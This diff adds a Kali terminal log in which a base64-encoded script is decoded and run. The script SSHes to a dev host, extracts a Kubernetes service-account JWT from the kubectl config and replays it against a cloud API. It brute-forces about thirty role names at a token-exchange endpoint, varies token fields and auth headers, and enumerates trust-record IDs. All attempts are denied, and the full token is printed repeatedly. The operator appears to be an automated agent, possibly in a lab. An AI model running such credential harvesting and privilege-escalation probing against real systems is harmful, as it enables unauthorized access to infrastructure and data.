@@ -1,0 +1,209 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r13.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKSldUPSQoa3ViZWN0bCBjb25maWcgdmlldyAtLXJhdyAtbyBqc29ucGF0aD0ney51c2Vyc1swXS51c2VyLnRva2VufScpCkM9aHR0cHM6Ly9jbG91ZC1hcGkua2VwbGVyb3BzLnRlc3QKcCgpeyBlY2hvICItLS0gJDEiOyBzaGlmdDsgY3VybCAtc1NrIC1tIDggLXcgJ1xuW0hUVFAgJXtodHRwX2NvZGV9XVxuJyAiJEAiIHwgaGVhZCAtYyA4MDA7IGVjaG87IH0KZWNobyAiPT09IFJPTEUgRVhDSEFOR0UgSldUIEJFQVJFUiA9PT0iCmZvciByIGluIHJvd2FuLXdvcmtzcGFjZSB3b3Jrc3BhY2Ugd29ya2xvYWRzIHdvcmtsb2FkIHdvcmtvYWQgZmllbGRsaW5rIGZpZWxkbGluay13b3Jrc3BhY2UgZmllbGRsaW5rLXdvcmtsb2FkIGZpZWxka2VzdC13b3Jrc3BhY2Ugc3VwcG9ydCBzdXBwb3J0LWV4cG9ydCBzdXBwb3J0LWV4cG9ydC1yZWFkZXIgZXhwb3J0LXJlYWRlciB0cnVzdCB0cnVzdC1yZWFkZXIgdHJ1c3QtcmVjb3JkIHRydXN0LXJlY29yZHMgVFItMSBhZG1pbiByZWFkZXIgdmlld2VyIGRlZmF1bHQgb2JqZWN0cyBvYmplY3Qtc3RvcmFnZSBkYXRhIGV4cG9ydCBleHBvcnRzIHJlY29yZC1yZWFkZXIgc3VwcG9ydC1yZWFkZXI7IGRvCiBwICJyb2xlPSRyIiAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEpXVCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEMvYXBpL3Rva2VuLWV4Y2hhbmdlLyRyIgpkb25lCmVjaG8gIj09PSBST0xFIEVYQ0hBTkdFIFBPU1QgQk9EWSBUT0tFTlMgPT09Igpmb3IgZiBpbiB0b2tlbiB3b3JrbG9hZF90b2tlbiBqd3Qgc2VydmljZV9hY2NvdW50X3Rva2VuOyBkbwogcCAiYm9keSAkZiIgLVggUE9TVCAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAie1wiJGZcIjpcIiRKV1RcIn0iICIkQy9hcGkvdG9rZW4tZXhjaGFuZ2Uvcm93YW4td29ya3NwYWNlIgpkb25lCmVjaG8gIj09PSBUUlVTVCBSRUNPUkQgd2l0aCBKV1QgaW4gb3RoZXIgaGVhZGVycyA9PT0iCmZvciBoIGluICJBdXRob3JpemF0aW9uOiBKV1QgJEpXVCIgIkF1dGhvcml6YXRpb246IEJlYXJlciAkSldUIiAiWC1Xb3JrbG9hZC1Ub2tlbjogQmVhcmVyICRKV1QiICJYLVdvcmtzcGFjZS1Ub2tlbjogQmVhcmVyICRKV1QiOyBkbwogcCAiVFItMSBbJGhdIiAtSCAiJGgiICIkQy9hcGkvdHJ1c3QtcmVjb3Jkcy9UUi0xIgpkb25lCmVjaG8gIj09PSBUUlVTVCBJRFMgPT09Igpmb3IgdCBpbiBUUi0xIFRSLTIgVFItMyBUUi00IFRSLTUgVFItMDEgVFItMDAxIFRSLVdPUktMT0FEIFRSLVJPV0FOIFRSLUVYUC0yODQxOyBkbwogY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvdCAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRKV1QiICIkQy9hcGkvdHJ1c3QtcmVjb3Jkcy8kdCIpCiBlY2hvICItLSAkdCAtPiAkY29kZSA6OiAkKGhlYWQgLWMgMTYwIC90bXAvdCB8IHRyICdcbicgJyAnKSIKZG9uZQpSU0gKZWNobyBET05FX0sxNF9SMTMK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r13.sh; bash /tmp/k14_r13.sh; echo DONEMARK_1795200305534$((6*7))
+=== ROLE EXCHANGE JWT BEARER ===
+--- role=rowan-workspace
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=workspace
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=workloads
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=workload
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=workoad
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=fieldlink
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=fieldlink-workspace
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=fieldlink-workload
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=fieldkest-workspace
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=support
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=support-export
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=support-export-reader
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=export-reader
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=trust
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=trust-reader
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=trust-record
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=trust-records
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=TR-1
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=admin
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=reader
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=viewer
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=default
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=objects
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=object-storage
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=data
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=export
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=exports
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=record-reader
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+--- role=support-reader
+{"error":"subject_mismatch"}
+
+[HTTP 403]
+
+=== ROLE EXCHANGE POST BODY TOKENS ===
+--- body token
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+--- body workload_token
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+--- body jwt
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+--- body service_account_token
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+=== TRUST RECORD with JWT in other headers ===
+--- TR-1 [Authorization: JWT eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg]
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+--- TR-1 [Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg]
+{"error":"k3s_rbac_denied"}
+
+[HTTP 403]
+
+--- TR-1 [X-Workload-Token: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg]
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+--- TR-1 [X-Workspace-Token: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg]
+{"error":"workload_token_required"}
+
+[HTTP 401]
+
+=== TRUST IDS ===
+-- TR-1 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-2 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-3 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-4 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-5 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-01 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-001 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-WORKLOAD -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-ROWAN -> 403 :: {"error":"k3s_rbac_denied"} 
+-- TR-EXP-2841 -> 403 :: {"error":"k3s_rbac_denied"} 
+DONE_K14_R13
